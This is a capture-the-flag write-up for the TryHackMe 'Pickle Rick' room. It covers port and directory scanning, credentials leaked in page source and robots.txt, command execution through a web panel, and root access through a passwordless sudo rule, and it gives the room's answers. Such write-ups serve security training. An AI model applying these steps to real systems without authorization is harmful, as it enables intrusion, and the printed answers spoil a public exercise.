# # Write-up: TryHackMe - Pickle Rick

## 📝 Room Information

- **Name:** Pickle Rick
    
- **Platform:** [TryHackMe](https://www.google.com/search?q=https://tryhackme.com/room/picklerick)
    
- **Difficulty:** Easy
    
- **Objective:** Help Rick make his potion by finding 3 hidden ingredients scattered across the server.

## 🔬 Phase 1: Reconnaissance & Enumeration

### 1. Nmap Scan

We start by scanning the target IP to see which ports are open.
Bash

```
nmap -sC -sV -oN nmap_report.txt <TARGET_IP>
```

**Results:**

- **Port 22 (SSH):** Open (OpenSSH 7.2p2)
- **Port 80 (HTTP):** Open (Apache httpd 2.4.18)

### 2. Web Enumeration (Port 80)

Visiting the website shows a note from Rick asking for help.

- **Source Code Inspection:** Right-clicking and viewing the page source reveals a hidden comment:

*```We found a username:* `RicksRules`. * **Directory Brute-Forcing (Gobuster/Dirbuster):** Next, we run a directory scan to find hidden pages or login portals. bash gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

**Interesting findings:**

- `/login.php` - A login panel.
    
- `/robots.txt` - Contains a strange string: `Wubbalubbadubdub`.
## 🔑 Phase 2: Gaining Access

Using the username `RicksRules` from the source code and the password `Wubbalubbadubdub` from `robots.txt`, we successfully log into `/login.php`.

We are redirected to a **Command Panel** (`portal.php`), which allows us to execute Linux commands directly on the server.
## 🏴‍☠️ Phase 3: Finding the Ingredients

### Ingredient #1

We run `ls` in the Command Panel to see the current directory contents:

*```Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
index.html
login.php
portal.php
__________________________________________________________________________
less Sup3rS3cretPickl3Ingred.txt```

> **Ingredient 1 Found:** `mr. meeseek hair`

Checking `clue.txt` tells us to look around the file system for the other ingredients.
### Ingredient #2

Let's see what users are on the system by listing the `/home` directory:

```ls /home```

Inside `/home/rick`, we find a file named `second ingredients`. Since it has a space in the name, we wrap it in quotes:

```less /home/rick/second ingredients```

**Ingredient 2 Found:** `1 jerry tear`

## ⚡ Phase 4: Privilege Escalation (Ingredient #3)

To find the final ingredient, we likely need `root` privileges. First, let's check our current user's sudo permissions:

`sudo -l`

`User www-data may run the following commands on thm-picklerick: (ALL : ALL) NOPASSWD: ALL`

_Jackpot._ `www-data` can run _any_ command as root without a password.

We can list the `/root` directory directly using `sudo`:

`sudo ls /root`

We see a file named `3rd.txt`. Let's read it:

``sudo less /root/3rd.txt``

**Ingredient 3 Found:** `fleeb juice`


## 🏁 Conclusion

The room was a fantastic introduction to web application testing, covering:

1. Source code comments leakage.
    
2. Sensitive data left in `robots.txt`.
    
3. Command injection via a web panel (and filter circumvention).
    
4. Misconfigured `sudo` rights leading to instant privilege escalation.
    

**Wubba Lubba Dub Dub! Room Completed!**